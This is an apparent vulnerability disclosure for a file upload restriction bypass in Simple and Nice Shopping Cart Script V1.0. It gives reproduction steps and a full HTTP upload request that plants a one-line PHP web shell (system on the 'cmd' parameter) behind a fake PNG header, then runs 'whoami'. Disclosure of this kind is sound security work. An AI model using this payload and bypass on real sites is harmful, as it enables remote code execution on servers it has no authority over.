>  Step To Reproduce:
>
>  	The following steps outline the exploitation of the file upload Restriction bypass vulnerability in  Simple and Nice Shopping Cart Script V1.0 aplication.
>  
>  	    1.	Launch the  Simple and Nice Shopping Cart Script V1.0
 
>   ![1](https://github.com/soundarkutty/File-upload-Restriction-bypass/assets/26168410/369cde53-d8fc-4e27-a227-6ebfa9612e2e)  
> 
>  	    2.	Open Home and click the Edit profile button and  I intercepted the request and checked whether the file upload functionality allowed PHP files. To my surprise, it did not have any validations for file content types or file content and upload a php script.

>!![2](https://github.com/soundarkutty/File-upload-Restriction-bypass/assets/26168410/afdcffae-2169-49c9-bc20-33612c5bc82c)
>![3](https://github.com/soundarkutty/File-upload-Restriction-bypass/assets/26168410/8402b312-fbac-4ecb-9146-e663ce3958ad)

>  	   
> 
>      3. Click the upload button and capture the request in burp  change the content type from application/octet-stream to image/png and send the request 
> 
>------------------------------------------
> 
>      4. Right Click and open the Uploaded php file  in the new tab.
>
>![6](https://github.com/soundarkutty/File-upload-Restriction-bypass/assets/26168410/78589836-8f29-42e0-a63d-cc8b5ce999a8)
 
>      5.	Finally able to execute RCE command on the systems http://localhost/mkshope/profile/1695462929.php?cmd=whoami
>       
>![10](https://github.com/soundarkutty/File-upload-Restriction-bypass/assets/26168410/be8bcff5-be27-4b6a-aa27-4f49e27546fe)

>            
> ------------------------------------------
> 
Below Exploitation request

> POST /mkshope/uploadp.php HTTP/1.1
> 
> Host: localhost
> 
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
> 
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
>
> Accept-Language: en-US,en;q=0.5
>
> Accept-Encoding: gzip, deflate
>
> Content-Type: multipart/form-data; boundary=---------------------------356831116312170623521151948206
>
>  Content-Length: 426
>
> Origin: http://localhost
>
> Connection: close
>
> Referer: http://localhost/mkshope/men/profile.php?mem_id=17
>
> Cookie: PHPSESSID=m1l3qpmuelcirrceg2gkmgn0s4
> 
> Upgrade-Insecure-Requests: 1
> 
> Sec-Fetch-Dest: document
>
> Sec-Fetch-Mode: navigate
>
> Sec-Fetch-Site: same-origin
>
> Sec-Fetch-User: ?1
> 
>-----------------------------35683111631217062352115194820
> Content-Disposition: form-data; name="photo"; filename="shell.php"
> Content-Type: application/octet-stream
>
> ?PNG
> ...
> <?php echo "<pre>";system($_REQUEST['cmd']);echo "</pre>"  ?>
> IEND
> 
>-----------------------------356831116312170623521151948206
> 
> Content-Disposition: form-data; name="submit"
>
> -----------------------------356831116312170623521151948206--


 [Vulnerability Type]
>
>   file upload Restriction bypass

> ------------------------------------------
>
 [Vendor of Product]
 
>  https://www.sourcecodester.com

>
 [Affected Product Code Base]
> 
>   Simple and Nice Shopping Cart Script V1.0  
>
> ------------------------------------------
>
  [Attack Type]
> 
>   Remote
>
> ------------------------------------------
>
 [Impact Code execution]
>
>    true
>
> ------------------------------------------
>
 [Reference]
 
>  https://www.sourcecodester.com/php/12579/simple-and-nice-shopping-cart-script.html
> 
> ------------------------------------------
>
 [Discoverer]

 
>   Soundar M
